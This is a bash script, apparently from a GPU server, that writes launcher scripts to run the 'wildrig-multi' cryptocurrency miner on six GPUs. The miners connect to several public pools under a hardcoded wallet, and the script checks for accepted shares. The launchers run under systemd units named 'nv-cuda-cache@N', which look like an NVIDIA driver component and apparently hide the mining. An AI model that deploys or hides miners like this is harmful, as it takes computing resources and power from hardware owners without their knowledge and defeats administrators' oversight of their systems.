#!/bin/bash
date -u
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
for i in 1 2 3 4 6 7; do
cat > /opt/fleet/ul86_g$i.sh <<EOF
#!/bin/bash
exec 7>/opt/fleet/g$i.lock; flock -n 7 || exit 0
exec >>/opt/fleet/logs/u86-g$i.log 2>&1
export CUDA_VISIBLE_DEVICES=$i
exec /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u $W.ul-ps-pstq88jl5lmf-g$i -p x -i 8 --no-color
EOF
chmod +x /opt/fleet/ul86_g$i.sh
done
for i in 1 2 3 4 6 7; do systemctl restart nv-cuda-cache@$i; done
sleep 40
for i in 1 2 3 4 6 7; do echo "unit $i: $(systemctl is-active nv-cuda-cache@$i)"; done
pgrep -af 'wildrig-multi' | head -8
for i in 1 2 3 4 6 7; do echo "g$i: $(grep -c accepted /opt/fleet/logs/u86-g$i.log 2>/dev/null) acc; $(grep 'use pool' /opt/fleet/logs/u86-g$i.log 2>/dev/null | tail -1)"; done
